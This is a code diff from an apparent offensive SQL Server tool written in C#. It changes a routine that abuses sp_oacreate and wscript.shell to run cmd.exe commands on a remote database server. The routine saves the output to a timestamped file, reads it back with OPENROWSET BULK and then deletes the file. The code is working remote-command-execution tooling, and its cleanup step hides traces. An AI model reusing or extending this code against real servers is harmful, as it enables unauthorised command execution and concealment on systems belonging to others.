@@ -61,6 +61,14 @@ exit                       - terminates the server process (and this session)"
             Console.WriteLine(Batch.RemoteExec(Conn, sqlstr, true));
         }
 
+        /// <summary>
+        /// 获取当前时间戳
+        /// </summary>
+        public static string GetTimeStamp()
+        {
+            TimeSpan ts = DateTime.UtcNow - new DateTime(1970, 1, 1, 0, 0, 0, 0);
+            return Convert.ToInt64(ts.TotalMilliseconds).ToString();
+        }
 
         /// <summary>
         /// sp_oacreate 执行命令
@@ -76,7 +84,7 @@ exit                       - terminates the server process (and this session)"
                     DECLARE @SHELL INT 
                     EXEC sp_oacreate 'wscript.shell', @SHELL OUTPUT 
                     EXEC sp_oamethod @SHELL, 'run' , NULL, 'c:\windows\system32\cmd.exe /c ");
-            string outfile = @"C:\Users\Public\Downloads\result.txt";
+            string outfile = String.Format(@"C:\Users\Public\Downloads\{0}.txt", GetTimeStamp());
             string sqlstr = shell + Command + @" > " + outfile + "'";
             Console.WriteLine(@"[+] c:\windows\system32\cmd.exe /c {0} > {1}", Command, outfile);
             Batch.RemoteExec(Conn, sqlstr, false);
@@ -85,8 +93,8 @@ exit                       - terminates the server process (and this session)"
                 Console.WriteLine("[!] {0} file does not exist....", outfile);
                 return;
             }
-            Console.WriteLine("[+] Reading " + outfile);
             Thread.Sleep(3000);
+            Console.WriteLine("[+] Reading " + outfile);
             string readstr = String.Format(@"SELECT * FROM OPENROWSET(BULK N'{0}', SINGLE_CLOB) rs", outfile);
             SqlCommand sqlComm = new SqlCommand(readstr, Conn);
             //string outreadstr;
@@ -102,6 +110,7 @@ exit                       - terminates the server process (and this session)"
                     }
                 }
             }
+            Console.WriteLine("[+] Deleting " + outfile);
             string delstr = String.Format(@"del {0}'", outfile);
             Batch.RemoteExec(Conn, shell + delstr, false);
 
